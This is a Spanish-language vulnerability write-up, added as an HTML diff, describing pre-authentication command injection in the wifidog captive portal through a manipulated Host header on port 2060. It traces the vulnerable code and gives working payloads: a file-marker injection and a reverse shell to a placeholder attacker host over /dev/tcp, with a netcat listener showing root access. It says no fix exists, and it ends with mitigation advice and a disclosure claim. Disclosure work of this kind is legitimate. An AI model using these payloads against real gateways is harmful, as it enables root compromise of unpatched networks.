@@ -1,0 +1,109 @@
+<aside class="tldr">
+  <div class="h">// En 30 segundos</div>
+  <ul>
+    <li>Un único request HTTP <b>pre-auth</b> al puerto 2060 con la cabecera <b>Host</b> manipulada termina en <code>execvp("/bin/sh","-c")</code>.</li>
+    <li>Resultado: <b>reverse shell como root</b> (uid=0), vía <b>CWE-78</b> en la frontera HTTP→firewall.</li>
+    <li>Cadena: <code>libhttpd/api.c:462</code> → <code>http.c:140/154</code> → <code>fw_iptables.c:596</code> → <code>util.c:96</code>.</li>
+    <li>Matiz honesto: el sink solo es alcanzable con un <b>FirewallRuleSet</b> global definido (config real de OpenWrt/redes municipales, no el default puro).</li>
+  </ul>
+</aside>
+
+<details class="toc-card" open>
+  <summary>/wifidog_host_header · <span class="tw">6</span> secciones</summary>
+  <ol>
+    <li><a href="#w00">Resumen ejecutivo</a></li>
+    <li><a href="#w01">0x00 — El camino del request</a></li>
+    <li><a href="#w02">0x01 — Los sinks</a></li>
+    <li><a href="#w03">0x02 — El PoC</a></li>
+    <li><a href="#w04">0x03 — Validación E2E: reverse shell root</a></li>
+    <li><a href="#w05">0x04 — Requisito de configuración y mitigación</a></li>
+  </ol>
+</details>
+
+<h2 id="w00"><span class="idx">01.</span> Resumen ejecutivo</h2>
+<p><b>wifidog</b> es un captive portal de código abierto para gateways WiFi (usado históricamente en OpenWrt y redes comunitarias/ISP). Expone un pequeño servidor HTTP en el puerto <code>2060</code> por defecto, que implementa el protocolo de la red de auth (WiFi municipal, Facebook WiFi, etc.). Esa superficie es <b>pre-auth</b>: cualquiera que alcance el puerto 2060 puede enviar requests.</p>
+<p>La vulnerabilidad: la cabecera <code>Host</code> del request termina interpolada en un comando <code>iptables</code> que se ejecuta con <code>/bin/sh -c</code>. Como el host no se valida, inyectar <code>;comando;#</code> en el header termina en ejecución de código como root.</p>
+
+<div class="callout callout-danger"><span class="ico">◆</span><div>
+  <div class="h">Veredicto</div>
+  <p><b>RCE root</b> · pre-auth · CWE-78 · Sin CVE conocido · Sin fix · Validado E2E con reverse shell <code>uid=0</code> · Requiere config <code>FirewallRuleSet</code> global.</p>
+</div></div>
+
+<h2 id="w01"><span class="idx">02.</span> 0x00 — El camino del request</h2>
+<ol>
+  <li><b>libhttpd/api.c:462</b> — el servidor HTTP embebido extrae la cabecera <code>Host</code> del request y la guarda sin validar.</li>
+  <li><b>http.c:140/154</b> — el request cae en la whitelist del portal (404/handling de auth); el host se propaga como candidato a la regla de permit.</li>
+  <li><b>fw_iptables.c:596</b> — <code>fw_allow_host</code> construye la cadena <code>iptables -d %s -j ACCEPT</code> con el host.</li>
+  <li><b>util.c:96</b> — <code>execvp("/bin/sh","-c",comando)</code> ejecuta la cadena. El <code>;</code> del payload cierra el contexto y ejecuta el comando inyectado.</li>
+</ol>
+
+<h2 id="w02"><span class="idx">03.</span> 0x01 — Los sinks</h2>
+<p>Este es el eslabón que convierte el host en comando. La cadena se arma con el host sin escapar y se entrega a <code>execvp</code> con <code>/bin/sh</code>:</p>
+<div class="code-wrap"><span class="lang">c</span><pre class="code"><code><span class="syn-c">// fw_iptables.c:596 — construye la regla con el host del atacante</span>
+<span class="syn-f">sprintf</span>(cmd, <span class="syn-s">"iptables -d %s -j ACCEPT"</span>, host);  <span class="syn-c">// host = cabecera Host</span>
+
+<span class="syn-c">// util.c:96 — ejecuta la cadena con sh -c (shell de sistema)</span>
+<span class="syn-f">execvp</span>(<span class="syn-s">"/bin/sh"</span>, argv);  <span class="syn-c">// argv = ["sh","-c", cmd]</span>
+
+<span class="syn-c">// Con Host = ";touch /tmp/wd_pwn;#.M" la regla efectiva es:</span>
+<span class="syn-c">//   iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT</span>
+<span class="syn-c">//   =&gt; el ';' cierra, touch se ejecuta, el '#' comenta el resto</span></code></pre></div>
+<div class="tbl-wrap">
+  <table>
+    <thead><tr><th>Archivo</th><th>Línea</th><th>Rol</th></tr></thead>
+    <tbody>
+      <tr><td>libhttpd/api.c</td><td>:462</td><td>Extracción de la cabecera Host</td></tr>
+      <tr><td>http.c</td><td>:140 / :154</td><td>Dispatch del request (whitelist 404)</td></tr>
+      <tr><td>fw_iptables.c</td><td>:596</td><td>Sink: sprintf de la regla con el host</td></tr>
+      <tr><td>util.c</td><td>:96</td><td>execvp(/bin/sh,-c) sobre la cadena</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h2 id="w03"><span class="idx">04.</span> 0x02 — El PoC</h2>
+<p>El PoC es un único request HTTP al puerto 2060 con el header Host manipulado. La forma más limpia de demostrar la ejecución es un marcador que se crea como root:</p>
+<div class="code-wrap"><span class="lang">http</span><pre class="code"><code><span class="syn-c"># Payload en la cabecera Host (marcador de archivo, fase inicial):</span>
+<span class="syn-k">Host</span>: <span class="syn-s">;touch /tmp/wd_pwn;#.M</span>
+
+<span class="syn-c"># El '.M' tras el '#' es el resto del host original que el '#' comenta.</span>
+<span class="syn-c"># Resultado: sh -c "iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT"</span>
+<span class="syn-c">#            =&gt; /tmp/wd_pwn creado como root</span></code></pre></div>
+<p>Para la validación definitiva, el marcador se sustituye por un reverse shell hacia el host atacante. Como wifidog corre habitualmente como root (para gestionar iptables), la shell llega directamente con <code>uid=0</code>.</p>
+
+<h2 id="w04"><span class="idx">05.</span> 0x03 — Validación E2E: reverse shell root</h2>
+<p>Se sigue el SOP E2E en container: se levanta wifidog con el cliente auth simulado, se envía el request malicioso y se confirma la reverse shell con <code>uid=0(root)</code>.</p>
+<div class="code-wrap"><span class="lang">bash</span><pre class="code"><code><span class="syn-c"># Container, wifidog compilado + authclient simulado escuchando</span>
+wf_auth_listen <span class="syn-c"># responde el protocolo de auth (necesario para completar el request)</span>
+wifidog -f -c /etc/wifidog.conf
+
+<span class="syn-c"># Envío del request con el header Host manipulado (reverse shell)</span>
+<span class="syn-k">Host</span>: <span class="syn-s">;bash -i &gt;&amp;/dev/tcp/ATTACKER/4444 0&gt;&amp;1;#.M</span>
+
+<span class="syn-c"># En el listener del atacante:</span>
+$ nc -lvnp 4444
+Connection received ... <span class="syn-c"># reverse shell como root</span>
+# id
+<span class="syn-s">uid=0(root)</span> <span class="syn-c"># RCE ROOT verificado</span></code></pre></div>
+<figure class="figure">
+  <img src="img/wifidog-phase2-listener.png" alt="Fase 2: listener y preparación del authclient" loading="lazy">
+  <figcaption class="figcap">Fase 2 — Preparación del entorno y listener del atacante.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/wifidog-phase3-injection.png" alt="Fase 3: el header Host inyectado en la petición" loading="lazy">
+  <figcaption class="figcap">Fase 3 — La petición con el header Host malicioso hacia el puerto 2060.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/wifidog-phase4-exploit.png" alt="Fase 4: ejecución en el host vía iptables" loading="lazy">
+  <figcaption class="figcap">Fase 4 — Ejecución en el host: la cadena iptables se construye con el host inyectado.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/wifidog-phase5-root-shell.png" alt="Fase 5: reverse shell como root" loading="lazy">
+  <figcaption class="figcap">Fase 5 — Reverse shell recibida como uid=0 (root). RCE verificada.</figcaption>
+</figure>
+
+<h2 id="w05"><span class="idx">06.</span> 0x04 — Requisito de configuración y mitigación</h2>
+<p>El camino <code>fw_allow_host</code> → <code>iptables -d</code> solo se recorre cuando existe al menos un <code>FirewallRuleSet</code> global definido en la config con una regla que use el host permitido. En la configuración por defecto pura de wifidog, esa sección puede estar vacía, lo que impide alcanzar el sink. En despliegues reales (OpenWrt, redes municipales, gateways de pago) suele definirse para autorizar hosts, lo que hace el sink alcanzable.</p>
+<div class="callout callout-warn"><span class="ico">⚠</span><div>
+  <div class="h">Divulgación responsable y mitigación</div>
+  <p>El fix correcto es validar/escapar el valor del host antes de interpolarlo en un comando — nunca pasar datos de red a un shell — o ejecutar las reglas iptables sin <code>sh -c</code>. Aplica a cualquier componente que derive comandos de firewall a partir de cabeceras HTTP. Comunicado al mantenedor como parte del proceso responsable.</p>
+</div></div>
